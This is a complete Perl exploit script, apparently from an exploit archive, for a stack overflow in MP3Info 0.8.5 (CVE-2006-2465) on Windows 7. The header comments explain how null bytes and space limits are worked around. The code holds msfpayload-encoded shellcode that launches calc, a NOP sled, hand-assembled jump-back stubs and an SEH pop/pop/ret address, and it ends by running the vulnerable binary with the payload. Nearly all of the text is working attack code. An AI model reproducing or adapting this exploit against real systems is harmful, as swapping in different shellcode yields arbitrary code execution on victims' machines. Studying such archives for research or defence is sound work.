# Exploit Title: mp3info SEH exploit
# Date: 18 March 2014
# Exploit Author: Ayman Sagy <aymansagy [at] gmail.com>
# Vendor Homepage: http://ibiblio.org/mp3info/
# Software Link: http://www.exploit-db.com/wp-content/themes/exploit/applications/cb7b619a10a40aaac2113b87bb2b2ea2-mp3info-0.8.5a.tgz
# Version: MP3Info 0.8.5
# Tested on: Windows 7 Ultimate 64 and 32 bit
# CVE : 2006-2465
# Original POC: http://www.exploit-db.com/exploits/31220/
#
# The process memory region starts with a null byte but exploitation is still possible because of
# the little endian architecture provided that the return address gets placed at the end of the buffer,
# this however confines us in the tiny 4-byte area after pop/pop/retn
# Using a couple of trampolines I jumped back to the beginning of the buffer which is 533 bytes, enough to fit a calc payload
#
# run in the same directory of MP3Info, the exploit will launch mp3info with the payload as argument: perl mp3infosploit.pl
 
 
 
# mangled chars: F4->34 F3->33
# msfpayload windows/exec cmd=calc R | msfencode -b '\x00\0d\0a\x09' -t perl
$shellcode =
"\xdb\xd4\xba\x2b\xc5\x7d\xb7\xd9\x74\x24\xf4\x58\x29\xc9" .
"\xb1\x32\x31\x50\x17\x83\xe8\xfc\x03\x7b\xd6\x9f\x42\x87" .
"\x30\xd6\xad\x77\xc1\x89\x24\x92\xf0\x9b\x53\xd7\xa1\x2b" .
"\x17\xb5\x49\xc7\x75\x2d\xd9\xa5\x51\x42\x6a\x03\x84\x6d" .
"\x6b\xa5\x08\x21\xaf\xa7\xf4\x3b\xfc\x07\xc4\xf4\xf1\x46" .
"\x01\xe8\xfa\x1b\xda\x67\xa8\x8b\x6f\x35\x71\xad\xbf\x32" .
"\xc9\xd5\xba\x84\xbe\x6f\xc4\xd4\x6f\xfb\x8e\xcc\x04\xa3" .
"\x2e\xed\xc9\xb7\x13\xa4\x66\x03\xe7\x37\xaf\x5d\x08\x06" .
"\x8f\x32\x37\xa7\x02\x4a\x7f\x0f\xfd\x39\x8b\x6c\x80\x39" .
"\x48\x0f\x5e\xcf\x4d\xb7\x15\x77\xb6\x46\xf9\xee\x3d\x44" .
"\xb6\x65\x19\x48\x49\xa9\x11\x74\xc2\x4c\xf6\xfd\x90\x6a" .
"\xd2\xa6\x43\x12\x43\x02\x25\x2b\x93\xea\x9a\x89\xdf\x18" .
"\xce\xa8\xbd\x76\x11\x38\xb8\x3f\x11\x42\xc3\x6f\x7a\x73" .
"\x48\xe0\xfd\x8c\x9b\x45\xf1\xc6\x86\xef\x9a\x8e\x52\xb2" .
"\xc6\x30\x89\xf0\xfe\xb2\x38\x88\x04\xaa\x48\x8d\x41\x6c" .
"\xa0\xff\xda\x19\xc6\xac\xdb\x0b\xa5\x33\x48\xd7\x2a";
 
 
$exploit = "\x90"x156 . $shellcode;
$exploit .= "\x41"x142;
 
                                     
$exploit .=                             # larger jump to beginning of buffer
            "\x58\x58\x58".             # 58 POP EAX x 3
            "\x80\xc4\x02".             # 80C4 02          ADD AH,2
            "\xFF\xE0";                 # FFE0             JMP EAX  
 
 
$exploit .= "\xEB\xEF\x90\x90"; # short jmp back to get some space
 
 
#print length($exploit);
#exit(0);
print "\n";
$seh = "\x46\x34\x40"; # 0x00403446  mp3info.exe             POP EBX
 
$exploit = $exploit . $seh;
 
system("mp3info.exe", $exploit);



